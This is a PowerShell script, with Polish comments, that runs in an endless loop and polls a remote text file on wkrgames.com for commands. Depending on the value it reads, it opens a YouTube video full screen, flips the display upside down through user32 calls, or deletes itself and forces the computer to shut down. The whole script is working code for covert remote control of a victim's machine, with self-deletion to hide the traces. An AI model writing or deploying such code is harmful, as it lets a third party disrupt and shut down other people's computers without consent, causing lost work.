$checkInterval = 5
$youtubeUrl = "https://www.youtube.com/watch?v=OaPNpvYTeI4"
$watchTime = 45
$url = "https://wkrgames.com/guslarz/pr/start.txt"

$scriptPath = $MyInvocation.MyCommand.Path

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class R{
[StructLayout(LayoutKind.Sequential)]
public struct D{
[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]
public string dmDeviceName;
public short dmSpecVersion;
public short dmDriverVersion;
public short dmSize;
public short dmDriverExtra;
public int dmFields;

public int dmPositionX;
public int dmPositionY;
public int dmDisplayOrientation;
public int dmDisplayFixedOutput;

[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]
public string dmFormName;

public short dmLogPixels;
public int dmBitsPerPel;
public int dmPelsWidth;
public int dmPelsHeight;
public int dmDisplayFlags;
public int dmDisplayFrequency;
}

[DllImport("user32.dll")]
public static extern int EnumDisplaySettings(string name,int mode,ref D dev);

[DllImport("user32.dll")]
public static extern int ChangeDisplaySettings(ref D dev,int flags);
}
"@

function Set-Rotation($rot){
$d=New-Object R+D
$d.dmSize=[Runtime.InteropServices.Marshal]::SizeOf($d)
[R]::EnumDisplaySettings($null,-1,[ref]$d)

$d.dmDisplayOrientation=$rot
$d.dmFields=0x80

[R]::ChangeDisplaySettings([ref]$d,0)|Out-Null
}

while ($true) {
    try {
        $content = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5
        $value = $content.Content.Trim()
    } catch {
        Start-Sleep $checkInterval
        continue
    }

    switch ($value) {

        "1" {
            Start-Process $youtubeUrl
            Start-Sleep 5
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait("f")
            Start-Sleep $watchTime
            if (Test-Path $scriptPath){Remove-Item $scriptPath -Force}
            Stop-Computer -Force
        }

        "2" {
            Start-Process $youtubeUrl
            Start-Sleep 5
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait("f")
        }

        "3" {
            if (Test-Path $scriptPath){Remove-Item $scriptPath -Force}
            Stop-Computer -Force
        }

        "4" { Set-Rotation 2 }  # do góry nogami 🍏
        "5" { Set-Rotation 0 }  # normalnie 🍏
    }

    Start-Sleep $checkInterval
}
